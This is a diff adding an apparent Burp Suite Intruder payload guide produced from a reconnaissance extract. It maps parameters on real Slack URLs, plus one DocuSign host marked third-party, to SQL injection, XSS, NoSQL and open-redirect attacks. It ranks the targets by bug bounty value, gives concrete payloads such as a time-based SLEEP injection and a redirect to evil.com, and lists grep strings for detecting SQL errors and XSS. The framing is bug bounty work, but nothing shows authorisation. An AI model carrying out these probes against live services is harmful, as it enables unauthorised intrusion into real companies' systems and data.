@@ -1,0 +1,179 @@
+========================================================================
+ BURP INTRUDER PAYLOAD GUIDE
+ Generated from recon-17 parameter extract
+========================================================================
+
+ HOW TO USE
+------------------------------------------------------------------------
+ 1. In Burp Suite: send request to Intruder
+ 2. Set attack type: Sniper (single param) or Pitchfork (multi)
+ 3. Mark the parameter value as §payload§
+ 4. Payload Sets → Load from file → pick the relevant .txt below
+ 5. For time-based: set Resource Pool → max 1 concurrent request
+    Filter results by response time > 4500ms = potential SQLi
+ 6. For boolean: compare response length/content between payloads
+
+ PARAMETER → PAYLOAD FILE MAPPING
+------------------------------------------------------------------------
+
+  PARAM: blocks
+  URL  : https://api.slack.com/block-kit-builder?blocks=§payload§
+  USE  : xss, nosql
+
+  PARAM: campaign
+  URL  : https://slack.com/contact-sales?campaign=§payload§
+  USE  : second_order, xss
+  HINT : Store payload first, then trigger the read-back feature
+
+  PARAM: category
+  URL  : https://slack.com/get-started?category=§payload§
+  USE  : time_based, boolean_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: entry_point
+  URL  : https://slack.com/get-started?entry_point=§payload§
+  USE  : second_order, xss
+  HINT : Store payload first, then trigger the read-back feature
+
+  PARAM: env
+  URL  : https://na2.docusign.net/...?env=§payload§  [3rd party]
+  USE  : time_based, boolean_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: features
+  URL  : https://slack.com/intl/ko-kr/contact-sales?features=§payload§
+  USE  : time_based, boolean_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: filter
+  URL  : https://api.slack.com/tools/deno-slack-sdk/reference/slack-functions?filter=§payload§
+  USE  : time_based, boolean_based, order_by, xss
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+  HINT : Compare ASC vs DESC response order difference
+
+  PARAM: from
+  URL  : https://slack.com/resources/why-use-slack/?from=§payload§
+  USE  : second_order, open_redirect
+  HINT : Store payload first, then trigger the read-back feature
+  HINT : Look for Location: header pointing to evil.com
+
+  PARAM: id
+  URL  : https://slack.com/contact-sales?id=§payload§
+  USE  : time_based, boolean_based, union_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: mode
+  URL  : https://api.slack.com/block-kit-builder?mode=§payload§
+  USE  : time_based, boolean_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: order
+  URL  : https://api.slack.com/?order=§payload§
+  USE  : order_by
+  HINT : Compare ASC vs DESC response order difference
+
+  PARAM: p
+  URL  : https://api.slack.com/get-started?p=§payload§
+  USE  : limit_offset
+
+  PARAM: page
+  URL  : https://slack.com/get-started?page=§payload§
+  USE  : limit_offset
+
+  PARAM: policy
+  URL  : https://slack.com/get-started?policy=§payload§
+  USE  : second_order, time_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+  HINT : Store payload first, then trigger the read-back feature
+
+  PARAM: query
+  URL  : https://api.slack.com/reference/methods?query=§payload§
+  USE  : time_based, boolean_based, union_based, xss, nosql
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: redir
+  URL  : https://api.slack.com/workspace-signin?redir=§payload§
+  USE  : open_redirect
+  HINT : Look for Location: header pointing to evil.com
+
+  PARAM: slug
+  URL  : https://slack.com/contact-sales?slug=§payload§
+  USE  : time_based, boolean_based, union_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: sort
+  URL  : https://api.slack.com/?sort=§payload§
+  USE  : order_by
+  HINT : Compare ASC vs DESC response order difference
+
+  PARAM: src
+  URL  : https://slack.com/help/requests/new?src=§payload§
+  USE  : xss, open_redirect
+  HINT : Look for Location: header pointing to evil.com
+
+  PARAM: template
+  URL  : https://api.slack.com/tools/block-kit-builder?template=§payload§
+  USE  : xss, time_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+
+  PARAM: terms
+  URL  : https://slack.com/contact-sales?terms=§payload§
+  USE  : second_order, time_based
+  HINT : Watch for >5000ms response delay = confirmed SQLi
+  HINT : Store payload first, then trigger the read-back feature
+
+
+========================================================================
+ PRIORITY ORDER (highest bug bounty value first)
+------------------------------------------------------------------------
+
+  1. redir param      → Open Redirect (easy win, Medium severity)
+                         URL: /workspace-signin?redir=https://evil.com
+
+  2. query param      → SQLi time-based blind
+                         URL: /reference/methods?query=canvas' AND SLEEP(5)--
+
+  3. filter param     → SQLi / XSS
+                         URL: /tools/deno-slack-sdk/reference/?filter=Messaging
+
+  4. blocks param     → JSON injection / XSS (rich input, JSON body)
+                         URL: /block-kit-builder?blocks=[{...}]
+
+  5. entry_point      → Second-order / XSS (reflected in page routing)
+                         URL: /get-started?entry_point=§payload§
+
+  6. from param       → Open redirect / Second-order
+                         URL: /resources/...?from=§payload§
+
+  7. slug / category  → SQLi via dynamic WHERE clause
+                         URL: /contact-sales?slug=§payload§
+
+  8. page param       → LIMIT/OFFSET injection
+                         URL: /get-started?page=§payload§
+
+========================================================================
+ BURP GREP MATCH STRINGS (add to Intruder > Options > Grep)
+------------------------------------------------------------------------
+
+  SQL errors to grep for:
+    you have an error in your sql syntax
+    warning: mysql
+    unclosed quotation mark
+    quoted string not properly terminated
+    pg_query()
+    supplied argument is not a valid mysql
+    ORA-01756
+    SQLiteException
+    System.Data.SQLite
+    syntax error at or near
+    unterminated string literal
+    invalid input syntax for type
+
+  Redirect detection:
+    Location: https://evil.com
+    Location: //evil.com
+
+  XSS detection:
+    <script>alert
+    onerror=alert
+    onload=alert
